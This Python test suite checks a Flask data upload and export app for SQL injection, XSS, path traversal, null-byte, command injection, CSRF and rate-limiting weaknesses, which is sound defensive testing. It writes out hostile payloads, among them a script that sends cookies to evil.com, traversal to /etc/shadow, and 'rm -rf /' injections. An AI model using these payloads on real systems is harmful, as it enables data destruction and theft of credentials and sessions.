"""
Test Security Vulnerabilities - BPS Data Management System
Testing untuk XSS, CSRF, file upload vulnerabilities, dan SQL injection
"""

import pytest
import os
from io import BytesIO
import pandas as pd
from unittest.mock import patch, MagicMock


class TestSecurityVulnerabilities:
    """Test class untuk security vulnerabilities"""

    def test_sql_injection_in_uploader_field(self, test_client):
        """Test SQL injection dalam field uploader"""
        sql_payloads = [
            "'; DROP TABLE data_entries; --",
            "' OR '1'='1",
            "admin'--",
            "'; SELECT * FROM data_entries; --",
            "' UNION SELECT sqlite_version(); --",
            "'; DELETE FROM aggregated_summary; --",
            "' OR 1=1; --",
            "test'; UPDATE data_entries SET value=999 WHERE '1'='1"
        ]

        for payload in sql_payloads:
            with test_client as client:
                df = pd.DataFrame({'Indicator': ['GDP'], '2024-01': [100]})
                excel_buffer = BytesIO()
                df.to_excel(excel_buffer, index=False)
                excel_buffer.seek(0)

                data = {
                    'uploader': payload,
                    'version': 'v1.0',
                    'data_type': 'flow',
                    'time_period': 'monthly'
                }
                file_data = (excel_buffer, 'test.xlsx')

                response = client.post('/upload',
                                     data=data,
                                     content_type='multipart/form-data',
                                     data_file=file_data)

                # Should not crash and should handle input safely
                assert response.status_code in [200, 302]

                # Verify no SQL injection occurred by checking if data was inserted
                if response.status_code == 302:
                    # Check if the malicious uploader name was properly escaped/stored
                    from models import query_data_entries
                    entries = query_data_entries(uploader=payload, limit=1)
                    # Should either be empty (rejected) or properly sanitized
                    assert len(entries) <= 1  # At most one entry with this uploader

    def test_sql_injection_in_version_field(self, test_client):
        """Test SQL injection dalam field version"""
        sql_payloads = [
            "v1.0'; DROP TABLE data_entries; --",
            "'; SELECT password FROM users; --",
            "test' UNION SELECT * FROM aggregated_summary; --"
        ]

        for payload in sql_payloads:
            with test_client as client:
                df = pd.DataFrame({'Indicator': ['GDP'], '2024-01': [100]})
                excel_buffer = BytesIO()
                df.to_excel(excel_buffer, index=False)
                excel_buffer.seek(0)

                data = {
                    'uploader': 'TestUser',
                    'version': payload,
                    'data_type': 'flow',
                    'time_period': 'monthly'
                }
                file_data = (excel_buffer, 'test.xlsx')

                response = client.post('/upload',
                                     data=data,
                                     content_type='multipart/form-data',
                                     data_file=file_data)

                assert response.status_code in [200, 302]

    def test_sql_injection_in_filter_parameters(self, populated_db):
        """Test SQL injection dalam parameter filter"""
        sql_payloads = [
            "'; DROP TABLE data_entries; --",
            "' OR '1'='1",
            "GDP' UNION SELECT * FROM aggregated_summary; --",
            "test' OR 1=1; --"
        ]

        with populated_db as client:
            for payload in sql_payloads:
                # Test in different filter parameters
                response = client.get(f'/preview-data?indicator={payload}')
                assert response.status_code == 200

                response = client.get(f'/preview-data?uploader={payload}')
                assert response.status_code == 200

                response = client.get(f'/export?indicator={payload}')
                assert response.status_code == 200

    def test_xss_in_uploader_field(self, test_client):
        """Test XSS dalam field uploader"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<div onmouseover=alert('XSS')>hover me</div>",
            "<script>document.location='http://evil.com'</script>",
            "<img src='x' onerror='alert(document.cookie)'>",
            "<script>fetch('http://evil.com?c='+document.cookie)</script>"
        ]

        for payload in xss_payloads:
            with test_client as client:
                df = pd.DataFrame({'Indicator': ['GDP'], '2024-01': [100]})
                excel_buffer = BytesIO()
                df.to_excel(excel_buffer, index=False)
                excel_buffer.seek(0)

                data = {
                    'uploader': payload,
                    'version': 'v1.0',
                    'data_type': 'flow',
                    'time_period': 'monthly'
                }
                file_data = (excel_buffer, 'test.xlsx')

                response = client.post('/upload',
                                     data=data,
                                     content_type='multipart/form-data',
                                     data_file=file_data)

                assert response.status_code in [200, 302]

                # Check if XSS payload is properly escaped in HTML output
                if response.status_code == 200:
                    response_text = response.get_data(as_text=True)
                    # XSS payloads should be escaped or not executed
                    assert payload not in response_text

    def test_xss_in_version_field(self, test_client):
        """Test XSS dalam field version"""
        xss_payloads = [
            "v1.0<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ]

        for payload in xss_payloads:
            with test_client as client:
                df = pd.DataFrame({'Indicator': ['GDP'], '2024-01': [100]})
                excel_buffer = BytesIO()
                df.to_excel(excel_buffer, index=False)
                excel_buffer.seek(0)

                data = {
                    'uploader': 'TestUser',
                    'version': payload,
                    'data_type': 'flow',
                    'time_period': 'monthly'
                }
                file_data = (excel_buffer, 'test.xlsx')

                response = client.post('/upload',
                                     data=data,
                                     content_type='multipart/form-data',
                                     data_file=file_data)

                assert response.status_code in [200, 302]

    def test_xss_in_indicator_names_excel(self, test_client):
        """Test XSS dalam nama indicator di Excel file"""
        xss_indicators = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>GDP",
            "GDP<svg onload=alert('XSS')>",
            "javascript:alert('XSS')GDP"
        ]

        for xss_indicator in xss_indicators:
            with test_client as client:
                df = pd.DataFrame({xss_indicator: [100], '2024-01': [100]})
                excel_buffer = BytesIO()
                df.to_excel(excel_buffer, index=False)
                excel_buffer.seek(0)

                data = {
                    'uploader': 'TestUser',
                    'version': 'v1.0',
                    'data_type': 'flow',
                    'time_period': 'monthly'
                }
                file_data = (excel_buffer, 'test.xlsx')

                response = client.post('/upload',
                                     data=data,
                                     content_type='multipart/form-data',
                                     data_file=file_data)

                assert response.status_code in [200, 302]

    def test_csrf_token_validation_missing(self, test_client):
        """Test bahwa endpoint upload menolak request tanpa CSRF token."""
        with test_client as client:
            df = pd.DataFrame({'Indicator': ['GDP'], '2024-01': [100]})
            excel_buffer = BytesIO()
            df.to_excel(excel_buffer, index=False)
            excel_buffer.seek(0)

            data = {
                'uploader': 'TestUser',
                'version': 'v1.0',
                'data_type': 'flow',
                'time_period': 'monthly'
            }
            file_data = (excel_buffer, 'test.xlsx')

            response = client.post('/upload',
                                 data=data,
                                 content_type='multipart/form-data',
                                 skip_csrf=True,
                                 data_file=file_data)

            assert response.status_code == 400

    def test_file_upload_path_traversal(self, test_client):
        """Test path traversal dalam file upload"""
        malicious_filenames = [
            "../../../etc/passwd.xlsx",
            "..\\..\\..\\windows\\system32\\config\\sam.xlsx",
            "test.xlsx/../../../etc/passwd",
            "test.xlsx\\..\\..\\..\\windows\\system32",
            "shell.php.xlsx",  # Double extension attack
            "test.xlsx.php",   # Double extension attack
            "test.php.xlsx",   # Double extension attack
        ]

        for malicious_filename in malicious_filenames:
            with test_client as client:
                df = pd.DataFrame({'Indicator': ['GDP'], '2024-01': [100]})
                excel_buffer = BytesIO()
                df.to_excel(excel_buffer, index=False)
                excel_buffer.seek(0)

                data = {
                    'uploader': 'TestUser',
                    'version': 'v1.0',
                    'data_type': 'flow',
                    'time_period': 'monthly'
                }
                file_data = (excel_buffer, malicious_filename)

                response = client.post('/upload',
                                     data=data,
                                     content_type='multipart/form-data',
                                     data_file=file_data)

                assert response.status_code in [200, 302]

                # Check if file was saved in expected location only
                expected_path = os.path.join('uploads', os.path.basename(malicious_filename))
                # werkzeug.utils.secure_filename should prevent path traversal
                assert not os.path.exists(expected_path) or expected_path.startswith('uploads/')

    def test_file_upload_null_byte_injection(self, test_client):
        """Test null byte injection dalam filename"""
        null_byte_filenames = [
            "test.xlsx\x00.php",
            "test\x00.xlsx",
            "shell\x00.php.xlsx",
            "test.xlsx\x00.txt"
        ]

        for null_filename in null_byte_filenames:
            with test_client as client:
                df = pd.DataFrame({'Indicator': ['GDP'], '2024-01': [100]})
                excel_buffer = BytesIO()
                df.to_excel(excel_buffer, index=False)
                excel_buffer.seek(0)

                data = {
                    'uploader': 'TestUser',
                    'version': 'v1.0',
                    'data_type': 'flow',
                    'time_period': 'monthly'
                }
                file_data = (excel_buffer, null_filename)

                response = client.post('/upload',
                                     data=data,
                                     content_type='multipart/form-data',
                                     data_file=file_data)

                assert response.status_code in [200, 302]

    def test_file_upload_mime_type_bypass(self, test_client):
        """Test bypass validasi MIME type"""
        # Create a file that looks like Excel but has different MIME type
        excel_content = b"PK\x03\x04\x14\x00\x00\x00\x00\x00"  # Excel file header

        with test_client as client:
            data = {
                'uploader': 'TestUser',
                'version': 'v1.0',
                'data_type': 'flow',
                'time_period': 'monthly'
            }
            # Try to upload with fake MIME type
            file_data = (BytesIO(excel_content), 'test.php')

            response = client.post('/upload',
                                 data=data,
                                 content_type='multipart/form-data',
                                 data_file=file_data)

            # Should be rejected due to extension check
            assert response.status_code in [200, 302]
            with client.session_transaction() as sess:
                flashed_messages = sess.get('_flashes', [])
                if flashed_messages:
                    assert any("format" in msg[1].lower() or "izin" in msg[1].lower() or "invalid" in msg[1].lower()
                              for msg in flashed_messages)
                else:
                    response_text = response.get_data(as_text=True).lower()
                    assert "invalid" in response_text or "format" in response_text or "excel" in response_text

    def test_directory_traversal_in_export(self, populated_db):
        """Test directory traversal dalam export parameters"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../../etc/shadow"
        ]

        with populated_db as client:
            for payload in traversal_payloads:
                response = client.get(f'/export?format=csv&data_type={payload}')
                assert response.status_code == 200
                # Should not allow access to system files

    def test_command_injection_in_export_format(self, populated_db):
        """Test command injection dalam export format"""
        injection_payloads = [
            "csv; rm -rf /",
            "excel | cat /etc/passwd",
            "csv && echo 'injected'",
            "excel || rm -rf uploads/*"
        ]

        with populated_db as client:
            for payload in injection_payloads:
                response = client.get(f'/export?format={payload}')
                assert response.status_code == 200
                # Should handle safely without executing commands

    def test_buffer_overflow_simulation(self, test_client):
        """Test simulasi buffer overflow dengan data sangat besar"""
        # Create extremely large field values
        large_data = "A" * 1000000  # 1MB string

        with test_client as client:
            data = {
                'uploader': large_data,
                'version': 'v1.0',
                'data_type': 'flow',
                'time_period': 'monthly'
            }

            df = pd.DataFrame({'Indicator': ['GDP'], '2024-01': [100]})
            excel_buffer = BytesIO()
            df.to_excel(excel_buffer, index=False)
            excel_buffer.seek(0)

            file_data = (excel_buffer, 'test.xlsx')

            response = client.post('/upload',
                                 data=data,
                                 content_type='multipart/form-data',
                                 data_file=file_data)

            # Should handle large data gracefully
            assert response.status_code in [200, 302, 413]

    def test_session_hijacking_simulation(self, test_client):
        """Test simulasi session hijacking"""
        # This test documents session security
        with test_client as client:
            # Check if session cookies are properly configured
            response = client.get('/upload')
            cookies = response.headers.getlist('Set-Cookie')

            # Check for secure session configuration
            session_secure = any('HttpOnly' in cookie for cookie in cookies)
            assert session_secure

    def test_information_disclosure_in_errors(self, test_client):
        """Test information disclosure dalam error messages"""
        with patch("infrastructure.db.get_session") as mock_conn:
            mock_conn.side_effect = Exception("Database error: connection to localhost:5432 failed")

            with test_client as client:
                df = pd.DataFrame({'Indicator': ['GDP'], '2024-01': [100]})
                excel_buffer = BytesIO()
                df.to_excel(excel_buffer, index=False)
                excel_buffer.seek(0)

                data = {
                    'uploader': 'TestUser',
                    'version': 'v1.0',
                    'data_type': 'flow',
                    'time_period': 'monthly'
                }
                file_data = (excel_buffer, 'test.xlsx')

                response = client.post('/upload',
                                     data=data,
                                     content_type='multipart/form-data',
                                     data_file=file_data)

                # Check if error messages leak sensitive information
                with client.session_transaction() as sess:
                    flashed_messages = sess.get('_flashes', [])
                    for category, message in flashed_messages:
                        # Should not contain database connection details, file paths, etc.
                        assert "localhost" not in message
                        assert "/var/" not in message
                        assert "C:\\" not in message
                        assert "password" not in message.lower()

    def test_rate_limiting_bypass(self, test_client):
        """Test rate limiting pada endpoint upload."""
        # This test verifies repeated submissions are throttled.
        with test_client as client:
            previous_limit = client.application.config.get("UPLOAD_RATE_LIMIT_MAX_REQUESTS")
            previous_window = client.application.config.get("UPLOAD_RATE_LIMIT_WINDOW_SECONDS")
            client.application.config["UPLOAD_RATE_LIMIT_MAX_REQUESTS"] = 3
            client.application.config["UPLOAD_RATE_LIMIT_WINDOW_SECONDS"] = 60
            try:
                rate_limited = False
                # Send multiple rapid requests
                for i in range(10):
                    df = pd.DataFrame({'Indicator': [f'GDP{i}'], '2024-01': [100]})
                    excel_buffer = BytesIO()
                    df.to_excel(excel_buffer, index=False)
                    excel_buffer.seek(0)

                    data = {
                        'uploader': f'TestUser{i}',
                        'version': 'v1.0',
                        'data_type': 'flow',
                        'time_period': 'monthly'
                    }
                    file_data = (excel_buffer, 'test.xlsx')

                    response = client.post('/upload',
                                         data=data,
                                         content_type='multipart/form-data',
                                         data_file=file_data)

                    if response.status_code == 429:
                        rate_limited = True

                assert rate_limited
            finally:
                client.application.config["UPLOAD_RATE_LIMIT_MAX_REQUESTS"] = previous_limit
                client.application.config["UPLOAD_RATE_LIMIT_WINDOW_SECONDS"] = previous_window